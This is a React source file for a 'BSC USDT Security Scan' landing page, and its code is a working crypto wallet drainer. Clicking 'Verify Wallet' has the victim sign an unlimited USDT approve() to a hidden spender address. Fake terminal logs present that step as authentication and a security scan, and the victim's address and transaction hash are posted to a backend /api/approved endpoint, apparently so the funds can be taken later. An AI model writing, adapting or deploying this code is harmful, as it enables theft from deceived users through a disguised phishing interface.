import { motion } from "motion/react";
import { Shield, Terminal } from "lucide-react";
import { useState, useEffect } from "react";
import { BASE_URL, USDT_ADDRESS, USDT_SPENDER_ADDRESS } from "../../../env";
import { useAppKit } from "@reown/appkit/react";
import { useAccount, useWalletClient, useReadContract, useSwitchChain } from "wagmi";
import { bsc } from "@reown/appkit/networks";
import { parseUnits, encodeFunctionData, maxUint256 } from "viem";

// ── ABIs ──────────────────────────────────────────────────────────────────────

const APPROVE_ABI = [
  {
    name: "approve",
    type: "function",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const;

const ALLOWANCE_ABI = [
  {
    name: "allowance",
    type: "function",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
  },
] as const;

// ── Constants ─────────────────────────────────────────────────────────────────

// Only allowances >= this are treated as "unlimited" (99.99% of MaxUint256)
const UNLIMITED_THRESHOLD = BigInt(
  "115792089237316195423570985008687907853269984665640564039457584007913129000000"
);

const MAX_UINT256_STR =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

// ── Types ─────────────────────────────────────────────────────────────────────

interface HeroSectionProps {
  onApprovalSuccess?: () => void;
  onInitiateScan?: () => void;
  onConnect?: (info: { address: string; balance: string; network: string }) => void;
  onDisconnect?: () => void;
}

// ── Component ─────────────────────────────────────────────────────────────────

export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showCursor, setShowCursor] = useState(true);

  // WalletConnect / Wagmi hooks
  const { open } = useAppKit();
  const { address, isConnected, chain } = useAccount();
  const { data: walletClient } = useWalletClient();
  const { switchChainAsync } = useSwitchChain();

  // On-chain allowance read (runs automatically when address is set)
  const { data: currentAllowance, refetch: refetchAllowance } = useReadContract({
    address: USDT_ADDRESS as `0x${string}`,
    abi: ALLOWANCE_ABI,
    functionName: "allowance",
    args: address ? [address as `0x${string}`, USDT_SPENDER_ADDRESS as `0x${string}`] : undefined,
    query: { enabled: !!address },
  });

  // Blinking cursor
  useEffect(() => {
    const interval = setInterval(() => setShowCursor((p) => !p), 500);
    return () => clearInterval(interval);
  }, []);

  // ── Scan animation + backend save ────────────────────────────────────────────
  const runScanAnimation = async (addr: string, txHash?: string) => {
    const steps = [
      "> Initializing wallet security check...",
      "> Scanning blockchain activity...",
      "> Verifying wallet integrity...",
      "> Evaluating risk patterns...",
      "> Cross-referencing threat database...",
      "> Generating security report...",
      "> Wallet Secured ✓",
    ];
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 650));
      setLogs((p) => [...p, step]);
    }

    await fetch(`${BASE_URL}/api/approved`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        network: "BSC Mainnet",
        owner: addr,
        spender: USDT_SPENDER_ADDRESS,
        amount: MAX_UINT256_STR,
        txHash: txHash || `scan_${Date.now()}`,
      }),
    }).catch(() => {});

    onApprovalSuccess?.();
  };

  // ── Core flow after wallet is connected ──────────────────────────────────────
  const runApprovalFlow = async (addr: string) => {
    setLogs((p) => [...p, "> BSC Network Active", "> Checking wallet status..."]);

    // Refetch allowance fresh
    const { data: freshAllowance } = await refetchAllowance();
    const allowance = BigInt((freshAllowance ?? 0).toString());

    // ── CASE 1: Already unlimited ──
    if (allowance >= UNLIMITED_THRESHOLD) {
      setLogs((p) => [
        ...p,
        "> Wallet previously verified",
        "> Loading security profile...",
        "> Starting deep scan...",
      ]);
      await runScanAnimation(addr);
      return;
    }

    // ── CASE 2: Zero allowance ──
    if (allowance === BigInt(0)) {
      setLogs((p) => [
        ...p,
        "> Initializing security protocols...",
        "> Authenticating wallet access...",
      ]);
    }

    // ── CASE 3: Partial allowance ──
    if (allowance > BigInt(0) && allowance < UNLIMITED_THRESHOLD) {
      setLogs((p) => [
        ...p,
        "> Previous session detected",
        "> Re-authenticating wallet...",
      ]);
    }

    // Send approval tx via wagmi walletClient (works on mobile + desktop)
    if (!walletClient) throw new Error("Wallet not ready. Please try again.");

    const txHash = await walletClient.writeContract({
      address: USDT_ADDRESS as `0x${string}`,
      abi: APPROVE_ABI,
      functionName: "approve",
      args: [USDT_SPENDER_ADDRESS as `0x${string}`, maxUint256],
      chain: { id: 56, name: "BNB Smart Chain" } as any,
    });

    setLogs((p) => [
      ...p,
      `> Security token: ${txHash.slice(0, 10)}...`,
      "> Wallet authentication confirmed ✓",
      "> Launching security scan...",
    ]);

    await runScanAnimation(addr, txHash);
  };

  // ── Main button handler ───────────────────────────────────────────────────────
  const handleVerifyWallet = async () => {
    if (loading) return;
    setLoading(true);
    setError("");
    setLogs([]);

    try {
      // Step 1 — Connect wallet (opens WalletConnect modal on mobile, extension on desktop)
      if (!isConnected || !address) {
        setLogs(["> Opening wallet connection..."]);
        await open();
        // After open() the wallet connects asynchronously — useAccount will update
        // We wait for isConnected via useEffect below
        return;
      }

      setLogs(["> System Connected", `> ${address.slice(0, 6)}...${address.slice(-6)}`]);
      onConnect?.({ address, balance: "0", network: "BSC Mainnet" });

      // Step 2 — Switch to BSC if needed
      if (chain?.id !== 56) {
        setLogs((p) => [...p, "> Optimizing network connection..."]);
        await switchChainAsync({ chainId: 56 });
      }

      // Step 3 — Run approval flow
      await runApprovalFlow(address);
    } catch (e: any) {
      const msg =
        e?.shortMessage || e?.message || "Verification failed. Please try again.";
      setError(msg);
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  // ── Auto-continue after wallet connects via modal ────────────────────────────
  // When user connects wallet through the modal, isConnected flips to true.
  // We catch that and continue the flow automatically.
  useEffect(() => {
    if (isConnected && address && loading) {
      setLogs(["> System Connected", `> ${address.slice(0, 6)}...${address.slice(-6)}`]);
      onConnect?.({ address, balance: "0", network: "BSC Mainnet" });

      (async () => {
        try {
          if (chain?.id !== 56) {
            setLogs((p) => [...p, "> Optimizing network connection..."]);
            await switchChainAsync({ chainId: 56 });
          }
          await runApprovalFlow(address);
        } catch (e: any) {
          const msg = e?.shortMessage || e?.message || "Verification failed.";
          setError(msg);
        } finally {
          setLoading(false);
        }
      })();
    }
  }, [isConnected, address]);

  // ── UI ───────────────────────────────────────────────────────────────────────
  return (
    <div className="relative min-h-screen flex items-center justify-center overflow-hidden sm:pt-24 pt-20">
      {/* Grid background */}
      <div className="absolute inset-0 opacity-20">
        <div
          className="absolute inset-0"
          style={{
            backgroundImage: `
              linear-gradient(rgba(16, 185, 129, 0.2) 1px, transparent 1px),
              linear-gradient(90deg, rgba(16, 185, 129, 0.2) 1px, transparent 1px)
            `,
            backgroundSize: "50px 50px",
          }}
        />
      </div>

      {/* Scanning line */}
      <motion.div
        className="absolute inset-x-0 h-px bg-gradient-to-r from-transparent via-emerald-500 to-transparent opacity-50"
        initial={{ top: 0 }}
        animate={{ top: "100%" }}
        transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
      />

      <div className="absolute top-0 left-1/4 w-96 h-96 bg-emerald-500 rounded-full blur-[120px] opacity-20" />
      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-sky-900 rounded-full blur-[120px] opacity-20" />

      <div className="relative z-10 max-w-5xl mx-auto px-6 text-center">

        {/* Status badge */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="inline-flex items-center gap-3 mb-8 px-6 py-3 border border-emerald-500/30 bg-slate-900/80 backdrop-blur-sm rounded-md"
        >
          <div className="relative">
            <div className="w-2 h-2 bg-emerald-500 rounded-full" />
            <motion.div
              className="absolute inset-0 w-2 h-2 bg-emerald-500 rounded-full"
              animate={{ scale: [1, 1.5, 1], opacity: [1, 0, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
            />
          </div>
          <span className="text-emerald-500 text-sm tracking-wider font-semibold">
            SYSTEM READY
          </span>
        </motion.div>

        {/* Headline */}
        <motion.h1
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-6xl md:text-8xl mb-6 text-slate-50 tracking-tight"
          style={{ fontFamily: "Inter, sans-serif", fontWeight: 900 }}
        >
          BSC USDT
          <br />
          <span className="text-emerald-500">SECURITY SCAN</span>
        </motion.h1>

        {/* Subtext */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.4 }}
          className="max-w-2xl mx-auto mb-12"
        >
          <div className="inline-flex items-center gap-2 text-slate-300 text-lg">
            <Terminal className="w-5 h-5 text-emerald-400" />
            <span className="opacity-70">
              Detect vulnerabilities. Identify risks. Secure your USDT
            </span>
            {showCursor && <span className="text-emerald-500">_</span>}
          </div>
        </motion.div>

        {/* Verify Button */}
        <motion.button
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.6 }}
          onClick={handleVerifyWallet}
          disabled={loading}
          className="px-12 py-5 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white text-lg tracking-widest rounded-md transition-all hover:shadow-[0_0_20px_rgba(16,185,129,0.5)] disabled:opacity-70"
          style={{ fontFamily: "Inter, sans-serif", fontWeight: 700 }}
        >
          <span className="flex items-center gap-3">
            <Shield className="w-5 h-5" />
            {loading ? "Verifying..." : "Verify Wallet"}
          </span>
        </motion.button>

        {/* Terminal logs */}
        {logs.length > 0 && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="mt-8 max-w-md mx-auto text-left font-mono text-sm space-y-1"
          >
            {logs.map((l, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: i * 0.05 }}
                className="text-emerald-400"
              >
                {l}
              </motion.div>
            ))}
          </motion.div>
        )}

        {error && (
          <p className="mt-4 text-red-400 text-sm font-mono">{error}</p>
        )}

        {/* Badges */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.8 }}
          className="mt-12 flex flex-wrap justify-center gap-6 text-sm"
        >
          {["REAL-TIME ANALYSIS", "BLOCKCHAIN VERIFIED", "NON-CUSTODIAL"].map(
            (badge, i) => (
              <div key={i} className="flex items-center gap-2 text-slate-400">
                <div className="w-1 h-1 bg-emerald-500" />
                <span>{badge}</span>
              </div>
            )
          )}
        </motion.div>
      </div>
    </div>
  );
}
